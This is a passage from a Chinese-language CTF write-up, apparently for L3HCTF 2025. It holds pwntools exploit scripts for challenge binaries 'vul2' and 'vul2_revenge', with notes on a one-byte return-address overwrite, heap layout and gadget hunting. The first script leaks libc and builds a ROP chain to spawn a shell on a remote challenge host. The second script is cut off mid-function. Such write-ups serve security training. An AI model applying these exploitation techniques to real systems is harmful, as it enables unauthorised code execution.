</span></span><span class=line><span class=cl><span class=n>lss</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>ls</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\033</span><span class=s1>[1;31;40m</span><span class=si>%s</span><span class=s1> -&gt; 0x</span><span class=si>%x</span><span class=s1> </span><span class=se>\033</span><span class=s1>[0m&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;43.138.2.216:9999&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;./vul2&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span><span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span><span class=n>gdbscript</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REM</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>process</span><span class=p>([</span><span class=n>binary</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#context(arch=&#39;amd64&#39;, log_level = &#39;debug&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=n>terminal</span><span class=o>=</span><span class=s1>&#39;tmux splitw -h -l 170&#39;</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>libc</span>
</span></span><span class=line><span class=cl><span class=c1>#elf  = ELF(binary)</span>
</span></span><span class=line><span class=cl><span class=c1>#print(context.binary.libs)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#39;./libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#import socks</span>
</span></span><span class=line><span class=cl><span class=c1>#context.proxy = (socks.SOCKS5, &#39;192.168.31.251&#39;, 10808)</span>
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>brva 0x00146F
</span></span></span><span class=line><span class=cl><span class=s1>brva 0x01817
</span></span></span><span class=line><span class=cl><span class=s1>#continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1>#import os</span>
</span></span><span class=line><span class=cl><span class=c1>#os.systimport os</span>
</span></span><span class=line><span class=cl><span class=c1>#io = remote(*attack.split(&#39;:&#39;))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>note_system</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>,</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Choose an option: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rm</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Choose an option: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Choose an option: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;---</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>([])</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;shout:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x103</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>+=</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x17</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pay</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=mh>0xc91A</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sl</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;[Attack]: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>libc_base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>rl</span><span class=p>())</span> <span class=o>-</span> <span class=mh>0x204643</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl>        <span class=n>lss</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>system</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>bin_sh</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>poprdi</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;pop rdi;ret&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=n>rop</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdi</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdi</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>bin_sh</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;shout:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x103</span>
</span></span><span class=line><span class=cl>        <span class=n>pay</span> <span class=o>+=</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x17</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pay</span> <span class=o>+=</span> <span class=n>rop</span>
</span></span><span class=line><span class=cl>        <span class=c1>#gdb.attach(io,gdbscript)</span>
</span></span><span class=line><span class=cl>        <span class=n>sl</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=heack_revenge>Heack_revenge</h2><p>fight_dragon 被修复了，但没完全修复，仍然存在 溢出，只不过只能修改返回地址的一个字节</p><p><img src=https://su-team.cn/img/2025-L3HCTF/31bdd8d6-7c8a-4c5a-9356-0beeedc18a8c.png alt=img></p><p>写个脚本把在 0x18xx 这段里的gadget 都找出来看看，有没有可以利用的</p><p><img src=https://su-team.cn/img/2025-L3HCTF/693c8005-17a5-433c-b432-28caf1e7c6f5.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=s1>&#39;FF488D05880C00004889C7E8F0F8FFFF8B45F4488B55F864482B1425280000007405E8E9F8FFFFC9C3F30F1EFA554889E54881ECB000000064488B042528000000488945F831C0488D8550FFFFFFBAA8000000BE000000004889C7E8D0F8FFFFC745E8050F2A01C745EC5D0F1F008B55E88B45EC31D08945F08B45F089C6488D053D0C00004889C7B800000000E88EF8FFFF488D05370C00004889C7E85FF8FFFFB800000000E8DF010000B800000000E8CB0200008945F48B45F483F8050F875001000089C0488D148500000000488D051B0D00008B04024898488D150F0D00004801D03EFFE0488B45D84889C7E829FEFFFFBF00000000E893F8FFFF488D05210C0000&#39;</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mh>0x10</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;--------------------&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>disasm</span><span class=p>(</span><span class=n>tmp</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>有个 pop rbp</p><p><img src=https://su-team.cn/img/2025-L3HCTF/d77fb7fe-c1e2-4de5-808c-5fe34a69a30a.png alt=img></p><p>恰好下面就是 heap地址，后继续运行程序并没有出错</p><p><img src=https://su-team.cn/img/2025-L3HCTF/0d441f67-7f39-4616-8f27-a5d96d9713d0.png alt=img></p><p>后面执行 note_system 可以看到 note_list[] 也在堆上了</p><p><img src=https://su-team.cn/img/2025-L3HCTF/9bc8087e-e4a6-4361-a60e-0b15de4b2c6c.png alt=img></p><p>需要在heap 上提前布局，然后泄露 heap 地址， game 函数 return 时 rsp 也在 heap 上（后面再堆风水，修改stack 进行rop）</p><p><img src=https://su-team.cn/img/2025-L3HCTF/55d7f1b7-5096-42cb-ba13-a1ad0fd127ef.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#from ctypes import CDLL</span>
</span></span><span class=line><span class=cl><span class=c1>#cdl = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>s</span>    <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>   <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>   <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>  <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>ls</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\033</span><span class=s1>[1;31;40m</span><span class=si>%s</span><span class=s1> -&gt; 0x</span><span class=si>%x</span><span class=s1> </span><span class=se>\033</span><span class=s1>[0m&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;43.138.2.216:19999&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;./vul2_revenge&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span><span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span><span class=n>gdbscript</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REM</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>process</span><span class=p>([</span><span class=n>binary</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#context(arch=&#39;amd64&#39;, log_level = &#39;debug&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=n>terminal</span><span class=o>=</span><span class=s1>&#39;tmux splitw -h -l 170&#39;</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>libc</span>
</span></span><span class=line><span class=cl><span class=c1>#elf  = ELF(binary)</span>
</span></span><span class=line><span class=cl><span class=c1>#print(context.binary.libs)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#39;./libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#import socks</span>
</span></span><span class=line><span class=cl><span class=c1>#context.proxy = (socks.SOCKS5, &#39;192.168.31.251&#39;, 10808)</span>
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>brva 0x01A0D
</span></span></span><span class=line><span class=cl><span class=s1>brva 0x1A1F
</span></span></span><span class=line><span class=cl><span class=s1>brva 0x01828
</span></span></span><span class=line><span class=cl><span class=s1>#continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1>#import os</span>
</span></span><span class=line><span class=cl><span class=c1>#os.systimport os</span>
</span></span><span class=line><span class=cl><span class=c1>#io = remote(*attack.split(&#39;:&#39;))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>note_system</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>,</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Choose an option: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;): &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;size (1-2048): &#39;</span><span class=p>)</span>
